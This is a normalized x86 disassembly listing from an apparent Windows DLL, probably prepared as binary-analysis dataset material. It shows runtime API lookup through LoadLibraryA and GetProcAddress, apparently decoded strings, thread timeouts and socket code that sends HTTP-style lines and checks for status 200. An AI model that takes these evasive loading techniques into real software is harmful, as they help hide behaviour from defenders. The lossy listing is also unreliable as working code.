call sub_10006bd0
test eax eax
jne r-xdata
mov edx [ esp + 0x18 ]
lea esi [ esp + 0x14 ]
mov eax edi
lea ecx [ esp + 0x168 ]
call sub_100075d0
test eax eax
jne r-xdata
mov esi [ Sleep@IAT ]
push 0x7d0
call esi
lea ecx [ esp + 0x28 ]
push ecx
mov ecx [ esp + 0x1c ]
call sub_10006bd0
test eax eax
jne r-xdata
mov edi [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
lea esi [ esp + 0x14 ]
lea ecx [ esp + 0xc70 ]
mov edx edi
call sub_100075d0
test eax eax
je r-xdata
mov eax 0xfffffffc
jmp r-xdata
push 0x7d0
call esi
mov ecx [ esp + 0x18 ]
lea edx [ esp + 0x28 ]
push edx
call sub_10006bd0
test eax eax
jne r-xdata
mov eax ebp
lea ecx [ esp + 0x870 ]
mov edx edi
call sub_100075d0
test eax eax
je r-xdata
mov eax 0xfffffffd
jmp r-xdata
mov eax ebx
lea ecx [ esp + 0x370 ]
mov edx edi
call sub_100075d0
test eax eax
jne r-xdata
mov ebx [ esp + 0x1888 ]
mov ebp [ esp + 0x18 ]
xor edi edi
test ebx ebx
jbe r-xdata
mov eax 0xfffffffb
jmp r-xdata
mov eax [ esp + 0x20 ]
lea esi [ esp + 0x14 ]
lea ecx [ esp + 0x1e8 ]
mov edx ebp
call sub_100075d0
test eax eax
jne r-xdata
mov eax ebx
sub eax edi
cmp eax 0x400
ja r-xdata
mov esi ebp
call sub_10007670
neg eax
sbb eax eax
and eax 0x8
add eax 0xfffffff8
mov eax 0xfffffff9
jmp r-xdata
mov eax 0x400
mov eax ebx
sub eax edi
jmp r-xdata
mov eax 0xfffffffa
jmp r-xdata
add edi [ esp + 0x14 ]
cmp edi ebx
jb r-xdata
mov ecx [ esp + 0x24 ]
add ecx edi
lea esi [ esp + 0x14 ]
mov edx ebp
call sub_100075d0
test eax eax
je r-xdata
sub_100060d0
sub esp 0x108
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x104 ] eax
push esi
mov ecx r--data
lea edx [ esp + 0x4 ]
call sub_100029c0
lea eax [ esp + 0x4 ]
push eax
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esp + 0x108 ]
pop esi
xor ecx esp
xor eax eax
call sub_1000c176
add esp 0x108
retn
mov ecx edi
lea edx [ esp + 0x4 ]
call sub_100029c0
lea ecx [ esp + 0x4 ]
push ecx
push esi
call [ GetProcAddress@IAT ]
pop esi
mov ecx [ esp + 0x104 ]
xor ecx esp
call sub_1000c176
add esp 0x108
retn
sub_10006170
cmp [ rw-data ] 0x1
jne r-xdata
push esi
push 0x404
call sub_1000cef2
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
push edi
mov edi r--data
call sub_100060d0
pop edi
test eax eax
jne r-xdata
push 0x404
push 0x0
push esi
call sub_1000ebe0
lea edx [ esi + 0x4 ]
add esp 0xc
mov [ esi ] 0x0
mov eax ebx
sub edx ebx
lea esp [ esp ]
pop esi
retn
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
call eax
retn
retn
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
mov eax esi
pop esi
retn
sub_100061e0
push ecx
cmp [ rw-data ] 0x1
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
push edi
mov ebx eax
jne r-xdata
push 0x130
call sub_1000cef2
mov esi eax
add esp 0x4
test esi esi
je r-xdata
mov edi r--data
call sub_100060d0
test eax eax
je r-xdata
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x8
push 0x130
push 0x0
push esi
call sub_1000ebe0
mov edx [ esp + 0x24 ]
movzx edi bx
add esp 0xc
lea ebx [ esi + 0x110 ]
push edi
mov ecx ebp
mov [ esi ] 0x1
mov [ esi + 0x4 ] edx
call sub_10007a10
add esp 0x4
mov [ esi + 0x8 ] eax
test eax eax
jne r-xdata
mov ecx [ esp + 0x18 ]
push 0x0
push 0x4400000
push 0x3
push 0x0
push 0x0
push ebx
push ebp
push ecx
call eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x8
lea edx [ esi + 0xc ]
mov eax ebp
sub edx ebp
push esi
call sub_1000c3e9
add esp 0x4
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
mov [ esi + 0x10c ] edi
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x8
sub_100062a0
cmp [ rw-data ] 0x1
push edi
jne r-xdata
xor edi edi
cmp esi edi
je r-xdata
mov edi r--data
call sub_100060d0
test eax eax
jne r-xdata
xor eax eax
pop edi
retn
mov eax [ esi ]
cmp eax 0x1
jne r-xdata
push esi
call eax
pop edi
retn
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
call closesocket
push esi
mov [ esi + 0x8 ] edi
call sub_1000c3e9
add esp 0x4
mov eax 0x1
pop edi
retn
push esi
call sub_1000c3e9
add esp 0x4
mov eax 0x1
pop edi
retn
cmp [ esi + 0x1434 ] edi
je r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x8 ]
push edx
call closesocket
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] edi
sub_10006320
push ecx
cmp [ rw-data ] 0x1
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
jne r-xdata
push 0x1438
call sub_1000cef2
mov esi eax
xor ebx ebx
add esp 0x4
cmp esi ebx
je r-xdata
mov edi r--data
call sub_100060d0
test eax eax
je r-xdata
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x10
push 0x1438
push ebx
push esi
call sub_1000ebe0
add esp 0xc
mov [ esi ] 0x2
mov [ esi + 0x4 ] ebp
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
push 0x0
push ecx
mov ecx [ esp + 0x24 ]
push 0x0
push 0x0
push 0x0
push edx
push ecx
push ebp
call eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x10
mov eax [ esp + 0x1c ]
lea edx [ esi + 0x8 ]
sub edx eax
mov edx [ ebp + 0x10c ]
lea ebx [ ebp + 0x110 ]
push edx
lea ecx [ ebp + 0xc ]
call sub_10007a10
add esp 0x4
mov [ ebp + 0x8 ] eax
test eax eax
jne r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
mov eax [ esp + 0x20 ]
lea edx [ esi + 0x28 ]
sub edx eax
xor ebx ebx
push esi
call sub_1000c3e9
add esp 0x4
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
pop edi
mov [ esi + 0x1430 ] ebx
mov [ esi + 0x428 ] ebx
mov [ esi + 0x1434 ] ebx
mov [ esi + 0x42c ] 0xffffffff
mov eax esi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x10
sub_10006420
push edi
mov edi r--data
mov [ rw-data ] 0x0
call sub_100060d0
pop edi
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x10 ]
push edx
mov edx [ ecx + 0xc ]
push edx
mov edx [ ecx + 0x8 ]
push edx
mov edx [ ecx + 0x4 ]
mov ecx [ ecx ]
push edx
push ecx
call eax
xor edx edx
test eax eax
setne dl
mov [ rw-data ] eax
mov eax edx
retn 0x4
retn 0x4
sub_10006470
mov eax 0x1774
call sub_1001a110
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1770 ] eax
push ebx
push esi
push edi
mov edi 0x1
mov esi ecx
xor ebx ebx
mov [ esp + 0x14 ] esi
cmp [ rw-data ] edi
jne r-xdata
push ebp
push 0x13ff
lea eax [ esp + 0x385 ]
push ebx
push eax
mov [ esp + 0x38c ] bl
call sub_1000ebe0
push 0x103
lea ecx [ esp + 0x181 ]
push ebx
push ecx
mov [ esp + 0x188 ] bl
call sub_1000ebe0
push 0x7f
lea edx [ esp + 0x4d ]
push ebx
push edx
mov [ esp + 0x38 ] edi
mov [ esp + 0x54 ] bl
call sub_1000ebe0
push 0x3f
lea eax [ esp + 0x159 ]
push ebx
push eax
mov [ esp + 0x160 ] bl
call sub_1000ebe0
push 0x3f
lea ecx [ esp + 0xe5 ]
push ebx
push ecx
mov [ esp + 0xec ] bl
call sub_1000ebe0
push 0x3f
lea edx [ esp + 0x131 ]
push ebx
push edx
mov [ esp + 0x138 ] bl
call sub_1000ebe0
add esp 0x48
mov ecx r--data
lea edx [ esp + 0x30 ]
call sub_100029c0
lea eax [ esp + 0x30 ]
push eax
lea ebp [ esi + 0x8 ]
add esi 0x28
push esi
push ebp
lea ecx [ esp + 0x38c ]
push r--data
push ecx
call sub_1000c36c
mov ecx r--data
lea edx [ esp + 0x44 ]
call sub_100029c0
lea edx [ esp + 0x44 ]
push edx
lea eax [ esp + 0x188 ]
push r--data
push eax
call sub_1000c36c
lea eax [ esp + 0x190 ]
add esp 0x20
mov ecx eax
push 0x104
lea eax [ esp + 0x279 ]
push ebx
push eax
mov [ esp + 0x1c ] ebx
mov [ esp + 0x24 ] esi
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
mov [ rw-data ] ebx
mov [ esp + 0x280 ] bl
call sub_1000ebe0
push 0x104
lea ecx [ esp + 0x17d ]
push ebx
push ecx
mov [ esp + 0x184 ] bl
call sub_1000ebe0
add esp 0x18
mov ecx r--data
lea edx [ esp + 0x274 ]
call sub_100029c0
mov ecx r--data
lea edx [ esp + 0x16c ]
call sub_100029c0
lea edx [ esp + 0x16c ]
push edx
lea eax [ esp + 0x278 ]
push eax
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
cmp eax ebx
je r-xdata
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
lea edi [ esp + 0x380 ]
sub eax ecx
mov esi ecx
dec edi
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ esp + 0x1770 ]
xor ecx esp
call sub_1000c176
add esp 0x1774
retn
lea ecx [ esp + 0x10 ]
push ecx
push ebx
lea edx [ esp + 0x20 ]
push edx
push sub_10006420
push ebx
push ebx
call eax
mov esi eax
push 0xea60
push esi
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
jne r-xdata
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx r--data
lea edx [ esp + 0x30 ]
call sub_100029c0
mov ecx r--data
lea edx [ esp + 0x30 ]
call sub_100029c0
lea ecx [ esp + 0x30 ]
push ecx
lea edx [ esp + 0x174 ]
push r--data
push edx
call sub_1000c36c
lea eax [ esp + 0x17c ]
add esp 0xc
mov ecx eax
lea esp [ esp ]
mov eax [ rw-data ]
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x1770 ]
xor ecx esp
call sub_1000c176
add esp 0x1774
retn
push ebx
push esi
call [ TerminateThread@IAT ]
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
lea edi [ esp + 0x380 ]
sub eax ecx
mov esi ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx r--data
lea edx [ esp + 0x30 ]
call sub_100029c0
mov eax [ esp + 0x18 ]
mov ecx [ eax + 0x4 ]
mov edx [ ecx + 0x4 ]
add edx 0x4
push edx
lea eax [ esp + 0x34 ]
push eax
lea ecx [ esp + 0x178 ]
push r--data
push ecx
call sub_1000c36c
lea eax [ esp + 0x180 ]
add esp 0x10
mov ecx eax
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
lea edi [ esp + 0x380 ]
sub eax ecx
mov esi ecx
dec edi
jmp r-xdata
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx r--data
lea edx [ esp + 0x30 ]
call sub_100029c0
mov edx [ esp + 0x18 ]
mov eax [ edx + 0x4 ]
add eax 0xc
push eax
lea ecx [ esp + 0x34 ]
push ecx
lea edx [ esp + 0x178 ]
push r--data
push edx
call sub_1000c36c
lea eax [ esp + 0x180 ]
add esp 0x10
mov ecx eax
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
lea edi [ esp + 0x380 ]
sub eax ecx
mov esi ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx r--data
lea edx [ esp + 0x30 ]
call sub_100029c0
lea eax [ esp + 0x30 ]
push eax
lea ecx [ esp + 0x174 ]
push r--data
push ecx
call sub_1000c36c
lea eax [ esp + 0x17c ]
add esp 0xc
mov ecx eax
lea esp [ esp ]
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
lea edi [ esp + 0x380 ]
sub eax ecx
mov esi ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x380 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
cmp al bl
jne r-xdata
mov ecx 0x6
mov esi r--data
[ edi ] [ esi ]
lea eax [ esp + 0x380 ]
movsw [ edi ] [ esi ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
mov edi [ esp + 0x18 ]
sub eax edx
movzx edx ax
mov eax [ edi + 0x1430 ]
cmp eax ebx
mov [ esp + 0x10 ] edx
mov si dx
jle r-xdata
add [ esp + 0x10 ] 0x2
movsx eax si
mov ecx 0xa0d
mov [ esp + eax + 0x380 ] cx
movsx eax [ esp + 0x10 ]
push ebx
push eax
mov [ esp + eax + 0x388 ] bl
mov eax [ edi + 0x4 ]
mov ecx [ eax + 0x8 ]
lea edx [ esp + 0x388 ]
push edx
push ecx
call send
mov ecx r--data
lea edx [ esp + 0x30 ]
call sub_100029c0
lea ecx [ esp + 0x30 ]
mov eax ebp
push eax
movsx ecx si
lea eax [ edi + 0x430 ]
push eax
lea edx [ esp + ecx + 0x388 ]
push edx
call sub_10013da0
add esp 0xc
add si [ edi + 0x1430 ]
mov [ esp + 0x10 ] si
sbb eax eax
sbb eax 0xffffffff
cmp dl bl
je r-xdata
mov ebp [ esp + 0x14 ]
mov edx [ edi + 0x4 ]
mov eax [ edx + 0x8 ]
push eax
push 0x400
lea ebx [ esp + 0x388 ]
call sub_10007ad0
add esp 0x8
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov [ edi + 0x1434 ] 0x1
xor eax eax
jmp r-xdata
mov ecx r--data
lea eax [ esp + 0x380 ]
lea esp [ esp ]
cmp eax ebx
je r-xdata
add eax 0x2
add ecx 0x2
cmp dl bl
jne r-xdata
mov ecx [ esp + 0x1780 ]
pop ebp
pop edi
pop esi
pop ebx
xor ecx esp
call sub_1000c176
add esp 0x1774
retn
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
lea eax [ esp + 0x380 ]
push r--data
push eax
call sub_1000c5d4
push r--data
push 0x0
call sub_1000c5d4
add esp 0x10
test eax eax
jne r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ ecx + 0x8 ]
push edx
push 0x400
lea ebx [ esp + 0x388 ]
call sub_10007ad0
add esp 0x8
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
push eax
call sub_1000d6ae
add esp 0x4
mov esi 0x1
cmp eax 0xc8
je r-xdata
mov esi 0x1
mov [ edi + 0x1434 ] esi
xor ebp ebp
jmp r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov ebp esi
xor ebp ebp
jmp r-xdata
mov ecx r--data
lea edx [ esp + 0x130 ]
call sub_100029c0
mov ecx r--data
lea edx [ esp + 0xb0 ]
call sub_100029c0
mov ecx r--data
lea edx [ esp + 0xf0 ]
call sub_100029c0
mov ecx [ edi + 0x4 ]
mov edx [ ecx + 0x8 ]
push edx
push 0x400
lea ebx [ esp + 0x388 ]
call sub_10007ad0
add esp 0x8
test eax eax
je r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov eax ebp
mov edi edi
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
push 0xe
lea eax [ esp + 0x134 ]
push eax
lea ecx [ esp + 0x388 ]
push ecx
call sub_1000db40
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
push 0x1a
lea eax [ esp + 0xb4 ]
push eax
lea ecx [ esp + 0x388 ]
push ecx
call sub_1000db40
add esp 0xc
test eax eax
jne r-xdata
lea edx [ esp + 0x38f ]
push edx
call sub_1000d698
add esp 0x4
mov [ edi + 0x42c ] eax
jmp r-xdata
test eax eax
je r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
push 0x11
lea edx [ esp + 0xf4 ]
push edx
lea eax [ esp + 0x388 ]
push eax
call sub_1000db40
add esp 0xc
test eax eax
jne r-xdata
mov [ edi + 0x428 ] esi
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ ecx + 0x8 ]
push edx
push 0x400
lea ebx [ esp + 0x388 ]
call sub_10007ad0
add esp 0x8
test eax eax
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov [ edi + 0x1434 ] esi
mov ecx r--data
lea eax [ esp + 0x380 ]
lea esp [ esp ]
jmp r-xdata
sub_10006b80
push edi
mov edi r--data
mov [ rw-data ] 0x0
call sub_100060d0
pop edi
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x10 ]
push edx
mov edx [ ecx + 0xc ]
push edx
mov edx [ ecx + 0x8 ]
push edx
mov edx [ ecx + 0x4 ]
mov ecx [ ecx ]
push edx
push ecx
call eax
xor edx edx
test eax eax
setne dl
mov [ rw-data ] eax
mov eax edx
retn 0x4
retn 0x4
sub_10006bd0
mov eax 0x1778
call sub_1001a110
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1774 ] eax
mov eax [ esp + 0x177c ]
push ebx
push esi
push edi
mov edi 0x1
mov esi ecx
xor ebx ebx
mov [ esp + 0x10 ] esi
mov [ esp + 0x14 ] eax
cmp [ rw-data ] edi
jne r-xdata
push ebp
push 0x13ff
lea eax [ esp + 0x389 ]
push ebx
push eax
mov [ esp + 0x390 ] bl
call sub_1000ebe0
push 0x103
lea ecx [ esp + 0xc5 ]
push ebx
push ecx
mov [ esp + 0xcc ] bl
call sub_1000ebe0
push 0x7f
lea edx [ esp + 0x51 ]
push ebx
push edx
mov [ esp + 0x40 ] edi
mov [ esp + 0x58 ] bl
call sub_1000ebe0
push 0x3f
lea eax [ esp + 0x1e5 ]
push ebx
push eax
mov [ esp + 0x1ec ] bl
call sub_1000ebe0
push 0x3f
lea ecx [ esp + 0x271 ]
push ebx
push ecx
mov [ esp + 0x278 ] bl
call sub_1000ebe0
push 0x3f
lea edx [ esp + 0x23d ]
push ebx
push edx
mov [ esp + 0x244 ] bl
call sub_1000ebe0
add esp 0x48
mov ecx r--data
lea edx [ esp + 0x34 ]
call sub_100029c0
lea eax [ esp + 0x34 ]
push eax
lea ebp [ esi + 0x8 ]
add esi 0x28
push esi
push ebp
lea ecx [ esp + 0x390 ]
push r--data
push ecx
call sub_1000c36c
mov ecx r--data
lea edx [ esp + 0x48 ]
call sub_100029c0
lea edx [ esp + 0x48 ]
push edx
lea eax [ esp + 0xcc ]
push r--data
push eax
call sub_1000c36c
lea eax [ esp + 0xd4 ]
add esp 0x20
mov ecx eax
push 0x104
mov [ esp + 0x24 ] eax
lea eax [ esp + 0x27d ]
push ebx
push eax
mov [ esp + 0x28 ] esi
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] ebx
mov [ rw-data ] ebx
mov [ esp + 0x284 ] bl
call sub_1000ebe0
push 0x104
lea ecx [ esp + 0xc1 ]
push ebx
push ecx
mov [ esp + 0xc8 ] bl
call sub_1000ebe0
add esp 0x18
mov ecx r--data
lea edx [ esp + 0x278 ]
call sub_100029c0
mov ecx r--data
lea edx [ esp + 0xb0 ]
call sub_100029c0
lea edx [ esp + 0xb0 ]
push edx
lea eax [ esp + 0x27c ]
push eax
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
cmp eax ebx
je r-xdata
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
lea edi [ esp + 0x384 ]
sub eax ecx
mov esi ecx
dec edi
xor eax eax
jmp r-xdata
lea ecx [ esp + 0x14 ]
push ecx
push ebx
lea edx [ esp + 0x24 ]
push edx
push sub_10006b80
push ebx
push ebx
call eax
mov esi eax
push 0xea60
push esi
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
jne r-xdata
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx r--data
lea edx [ esp + 0x34 ]
call sub_100029c0
mov ecx r--data
lea edx [ esp + 0x34 ]
call sub_100029c0
lea ecx [ esp + 0x34 ]
push ecx
lea edx [ esp + 0xb8 ]
push r--data
push edx
call sub_1000c36c
lea eax [ esp + 0xc0 ]
add esp 0xc
mov ecx eax
lea ecx [ ecx ]
mov ecx [ esp + 0x1780 ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_1000c176
add esp 0x1778
retn 0x4
mov eax [ rw-data ]
jmp r-xdata
push ebx
push esi
call [ TerminateThread@IAT ]
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
lea edi [ esp + 0x384 ]
sub eax ecx
mov esi ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx r--data
lea edx [ esp + 0x34 ]
call sub_100029c0
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0x4 ]
mov edx [ ecx + 0x4 ]
add edx 0x4
push edx
lea eax [ esp + 0x38 ]
push eax
lea ecx [ esp + 0xbc ]
push r--data
push ecx
call sub_1000c36c
lea eax [ esp + 0xc4 ]
add esp 0x10
mov ecx eax
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
lea edi [ esp + 0x384 ]
sub eax ecx
mov esi ecx
dec edi
jmp r-xdata
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx r--data
lea edx [ esp + 0x34 ]
call sub_100029c0
mov edx [ esp + 0x14 ]
mov eax [ edx + 0x4 ]
add eax 0xc
push eax
lea ecx [ esp + 0x38 ]
push ecx
lea edx [ esp + 0xbc ]
push r--data
push edx
call sub_1000c36c
lea eax [ esp + 0xc4 ]
add esp 0x10
mov ecx eax
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
lea edi [ esp + 0x384 ]
sub eax ecx
mov esi ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx r--data
lea edx [ esp + 0x34 ]
call sub_100029c0
lea eax [ esp + 0x34 ]
push eax
lea ecx [ esp + 0xb8 ]
push r--data
push ecx
call sub_1000c36c
lea eax [ esp + 0xc0 ]
add esp 0xc
mov ecx eax
lea esp [ esp ]
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
lea edi [ esp + 0x384 ]
sub eax ecx
mov esi ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x384 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
cmp al bl
jne r-xdata
mov ecx 0x6
mov esi r--data
[ edi ] [ esi ]
lea eax [ esp + 0x384 ]
movsw [ edi ] [ esi ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
mov edi [ esp + 0x14 ]
sub eax edx
movzx edx ax
mov eax [ edi + 0x1430 ]
cmp eax ebx
mov [ esp + 0x10 ] edx
mov si dx
jle r-xdata
mov eax [ esp + 0x18 ]
cmp eax ebx
je r-xdata
push eax
movsx ecx si
lea eax [ edi + 0x430 ]
push eax
lea edx [ esp + ecx + 0x38c ]
push edx
call sub_10013da0
add esp 0xc
add si [ edi + 0x1430 ]
mov [ esp + 0x10 ] si
add [ esp + 0x10 ] 0x2
movsx edx si
mov eax 0xa0d
mov [ esp + edx + 0x384 ] ax
movsx eax [ esp + 0x10 ]
mov edx [ edi + 0x4 ]
push ebx
push eax
lea ecx [ esp + 0x38c ]
mov [ esp + eax + 0x38c ] bl
mov eax [ edx + 0x8 ]
push ecx
push eax
call send
mov ecx r--data
lea edx [ esp + 0x34 ]
call sub_100029c0
lea ecx [ esp + 0x34 ]
mov eax ebp
mov eax [ eax + 0x1c ]
push eax
lea ecx [ esp + 0xb8 ]
push r--data
push ecx
call sub_1000c36c
lea eax [ esp + 0xc0 ]
movsx edx si
mov ecx eax
add esp 0xc
sub edx ecx
lea edx [ esp + edx + 0x384 ]
nop
sbb eax eax
sbb eax 0xffffffff
cmp dl bl
je r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
lea eax [ esp + 0xb4 ]
lea edx [ eax + 0x1 ]
mov esi [ esp + 0x1c ]
mov ecx [ edi + 0x4 ]
mov edx [ ecx + 0x8 ]
push edx
push 0x400
lea ebx [ esp + 0x38c ]
call sub_10007ad0
add esp 0x8
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
add [ esp + 0x10 ] eax
mov si [ esp + 0x10 ]
mov [ edi + 0x1434 ] 0x1
xor eax eax
jmp r-xdata
lea ecx [ ecx ]
cmp eax ebx
je r-xdata
add eax 0x2
add ecx 0x2
cmp dl bl
jne r-xdata
pop ebp
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
lea edx [ esp + 0x384 ]
push r--data
push edx
call sub_1000c5d4
push r--data
push 0x0
call sub_1000c5d4
add esp 0x10
test eax eax
jne r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ eax + 0x8 ]
push ecx
push 0x400
lea ebx [ esp + 0x38c ]
call sub_10007ad0
add esp 0x8
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
push eax
call sub_1000d6ae
add esp 0x4
cmp eax 0xc8
je r-xdata
mov ebp 0x1
mov [ edi + 0x1434 ] ebp
xor esi esi
jmp r-xdata
mov ecx r--data
lea eax [ esp + 0x384 ]
lea esp [ esp ]
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov esi [ esp + 0x1c ]
mov ebp esi
xor esi esi
lea ebp [ esi + 0x1 ]
jmp r-xdata
mov ecx r--data
lea edx [ esp + 0x1bc ]
call sub_100029c0
mov ecx r--data
lea edx [ esp + 0x23c ]
call sub_100029c0
mov ecx r--data
lea edx [ esp + 0x1fc ]
call sub_100029c0
mov eax [ edi + 0x4 ]
mov ecx [ eax + 0x8 ]
push ecx
push 0x400
lea ebx [ esp + 0x38c ]
call sub_10007ad0
add esp 0x8
test eax eax
je r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov eax esi
mov ecx r--data
lea eax [ esp + 0x384 ]
lea esp [ esp ]
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
push 0xe
lea edx [ esp + 0x1c0 ]
push edx
lea eax [ esp + 0x38c ]
push eax
call sub_1000db40
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
push 0x1a
lea edx [ esp + 0x240 ]
push edx
lea eax [ esp + 0x38c ]
push eax
call sub_1000db40
add esp 0xc
test eax eax
jne r-xdata
lea ecx [ esp + 0x393 ]
push ecx
call sub_1000d698
add esp 0x4
mov [ edi + 0x42c ] eax
jmp r-xdata
test eax eax
je r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
push 0x11
lea ecx [ esp + 0x200 ]
push ecx
lea edx [ esp + 0x38c ]
push edx
call sub_1000db40
add esp 0xc
test eax eax
jne r-xdata
mov [ edi + 0x428 ] ebp
jmp r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ eax + 0x8 ]
push ecx
